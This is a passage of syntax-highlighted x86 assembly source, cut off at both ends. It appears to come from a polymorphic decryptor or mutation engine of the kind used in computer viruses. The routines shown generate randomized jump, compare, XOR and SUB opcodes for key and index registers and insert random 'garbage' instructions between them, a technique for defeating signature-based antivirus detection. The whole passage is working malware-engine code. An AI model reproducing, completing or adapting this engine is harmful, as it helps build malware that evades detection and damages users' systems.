                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65FFh</span><span class="sc0">   </span><span class="sc1">; We have to store JMP [EBP+00], so we do</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; it (a single EBP can't go alone, since</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; 5 is the identifier of a direct memory</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; address)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">      </span><span class="sc1">; Return</span><span class="sc0">

         </span><span class="sc1">;; MOV Reg,[Memory_Address]/JMP Reg</span><span class="sc0">
   </span><span class="sc5">@@MOV__JMP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the reserved register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0FFh</span><span class="sc0">    </span><span class="sc1">; Opcode of JMP Reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">        </span><span class="sc1">; Set the register in the opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                 </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">        </span><span class="sc1">; Return</span><span class="sc0">

           </span><span class="sc1">;; PUSH [Memory_Address]/RET</span><span class="sc0">
   </span><span class="sc5">@@PUSH__RET</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">   </span><span class="sc1">; AL=opcode of RET</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">              </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">     </span><span class="sc1">; Return</span><span class="sc0">

           </span><span class="sc1">;; JMP [Memory_Address]</span><span class="sc0">
   </span><span class="sc5">@@JMP__</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMP__Direct</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Store_01</span><span class="sc0">
   </span><span class="sc5">@@JMP__Direct</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0"> </span><span class="sc1">; AX=opcode of JMP [Memory_Address]</span><span class="sc0">
    </span><span class="sc5">@@Store_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">; Complete the opcode with the memory address</span><span class="sc0">
              </span><span class="sc1">;  jmp   @@Return</span><span class="sc0">

   </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyOfUsedRegisters</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Restore the re-</span><span class="sc0">
                                                            </span><span class="sc1">; served registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Replace EDI in the stack</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">             </span><span class="sc1">; Restore registers</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">               </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoFinalJMP</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function selects two registers from Index1, Index2 or Counter, and</span><span class="sc0">
</span><span class="sc1">;; sets them on Index1. The key register remains unchanged, since it's needed</span><span class="sc0">
</span><span class="sc1">;; for the indexed memory accesses, due to the fact that its value never</span><span class="sc0">
</span><span class="sc1">;; changes.</span><span class="sc0">
</span><span class="sc5">SelectOnlyTwoRegs</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Get a random value from 0 to 3</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Key register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherRandom</span><span class="sc0"> </span><span class="sc1">; If so, then get another random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">CopyOfUsedRegisters</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the</span><span class="sc0">
                                                            </span><span class="sc1">; register in DL</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08080800h</span><span class="sc0"> </span><span class="sc1">;Set the other three as 08 (unreserved)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set them as the</span><span class="sc0">
                                                            </span><span class="sc1">; new registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyOfUsedRegisters</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; key register.</span><span class="sc0">
                                 </span><span class="sc1">; This must be for the indexed memory writes</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SelectOnlyTwoRegs</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function constructs a comparision between a register and a value. The</span><span class="sc0">
</span><span class="sc1">;; comparision only can be used with JZ/JNZ. BufferRegister is used to make</span><span class="sc0">
</span><span class="sc1">;; a wider variety.</span><span class="sc0">
</span><span class="sc5">DoCMP</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get buffer reg.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; If there isn't any reserved, reserve one</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ThereIsOneSelected</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
     </span><span class="sc5">@@ThereIsOneSelected</span><span class="sc4">:</span><span class="sc0">

     </span><span class="sc5">@@Repeat</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">      </span><span class="sc1">; Get a random value between 0 and 7</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Repeat</span><span class="sc0">     </span><span class="sc1">; If 0, repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@PUSHXXX</span><span class="sc0">    </span><span class="sc1">; If 1-2, make PUSH/Comp/POP</span><span class="sc0">
               </span><span class="sc1">; jb    @@PUSHSUB</span><span class="sc0">
               </span><span class="sc1">; jz    @@PUSHXOR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">      </span><span class="sc1">; If 3, do direct CMP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Save EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVRegReg</span><span class="sc0">  </span><span class="sc1">; Move the value of Index2 (the register</span><span class="sc0">
                                     </span><span class="sc1">; to compare) to BufferRegister</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make a good amount of garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; Restore EAX in ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DL=BufferRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InitialValue</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=Initial value of Index2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@MOVSUB</span><span class="sc0">   </span><span class="sc1">; CL=4, then do SUB BufferRegister,Value</span><span class="sc0">
                                 </span><span class="sc1">;            or ADD BufferRegister,NEG(Value)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVCMP</span><span class="sc0">   </span><span class="sc1">; CL=5, then do CMP BufferRegister,Value</span><span class="sc0">
     </span><span class="sc5">@@MOVXOR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXOR</span><span class="sc0">    </span><span class="sc1">; CL=6, then do XOR BufferRegister,Value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">     </span><span class="sc1">; Jump and finish</span><span class="sc0">
     </span><span class="sc5">@@MOVSUB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUB</span><span class="sc0">    </span><span class="sc1">; Make that SUB/ADD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">     </span><span class="sc1">; Jump and finish</span><span class="sc0">
     </span><span class="sc5">@@MOVCMP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; If BufferRegister=EAX, then jump to store</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_EAX</span><span class="sc0">  </span><span class="sc1">; its own opcode</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F881h</span><span class="sc0">  </span><span class="sc1">; Opcode of CMP Reg,Value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Set the register to the opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@J01</span><span class="sc0">      </span><span class="sc1">; Jump to store the value</span><span class="sc0">

     </span><span class="sc5">@@CMP_EAX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">  </span><span class="sc1">; AL=Opcode of CMP EAX,Value</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
         </span><span class="sc5">@@J01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">; Store the value to compare</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">      </span><span class="sc1">; Return</span><span class="sc0">

     </span><span class="sc5">@@CMP</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct_CMPRegReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the Index2 register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InitialValue</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=Value to compare</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOVCMP</span><span class="sc0">      </span><span class="sc1">; Jump here to do a direct CMP</span><span class="sc0">
     </span><span class="sc5">@@Direct_CMPRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InitialValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@D_CMPRR03</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@D_CMPRRXOR</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRRSUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C029h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@D_CMPRR02</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRRXOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C031h</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRR02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@D_CMPRR01</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRR01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@D_CMPRR04</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRR03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C039h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@D_CMPRR05</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRR05</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@D_CMPRR04</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc5">@@D_CMPRR04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

   </span><span class="sc1">;; Here we make PUSH Index2Register / XOR/SUB(ADD) Index2Register,(-)Value /</span><span class="sc0">
   </span><span class="sc1">;;              / POP Index2Register</span><span class="sc0">
     </span><span class="sc5">@@PUSHXXX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">   </span><span class="sc1">; Make a PUSH Index2Register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Store that opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InitialValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; (get the value to compare)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; XOR or SUB/ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHSUB</span><span class="sc0">   </span><span class="sc1">; Do SUB</span><span class="sc0">
     </span><span class="sc5">@@PUSHXOR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@PUSHXOR_D</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHXOR_R</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
   </span><span class="sc5">@@PUSHXOR_R</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PUSH_01</span><span class="sc0">
   </span><span class="sc5">@@PUSHXOR_D</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXOR</span><span class="sc0">     </span><span class="sc1">; Do a XOR with that value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PUSH_01</span><span class="sc0">   </span><span class="sc1">; Jump to POP the register</span><span class="sc0">
     </span><span class="sc5">@@PUSHSUB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@PUSHSUB_D</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
